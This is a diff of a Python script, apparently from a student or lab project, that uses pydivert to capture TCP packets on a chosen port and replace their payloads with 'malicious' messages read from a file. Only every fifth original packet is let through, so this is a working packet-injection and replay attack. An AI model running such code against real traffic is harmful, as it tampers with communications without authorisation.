@@ -12,12 +12,19 @@ def copy_packet(original_packet):
     #new_packet.protocol = original_packet.protocol
     return new_packet
 
-def replayAttack(sourcePort):
+def replayAttack(sourcePort,file):
+    counter = 0
     with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
         for packet in w:
-            attackMessages = takeMessagesForAttack() # vadim poruke za napad
-            copyList = [copy_packet(packet) for i in range(5)] #kopira se originalni paket kako bi se mogao napuniti sa payloadovima novim
-            for i in range(len(copyList)):
-                copyList[i].payload = attackMessages[i] #puni se
-            [w.send(copyList[j]) for j in range(len(copyList))] #salje se svaka kopija
-            w.send(packet) #salje se originalni
+            attackMessages = file[counter] # vadim poruke za napad
+            print(f"Attack message from file:{attackMessages}")
+            print(f"Message from packet {packet.payload}")
+            if counter%5 != 0:
+                print("Poslao maliciuznu")
+                paketCopy = copy_packet(packet)
+                paketCopy.payload = attackMessages
+                w.send(paketCopy)
+                counter += 1
+            else:
+                w.send(packet) #svaki peti ce se slati originalni
+                counter+=1
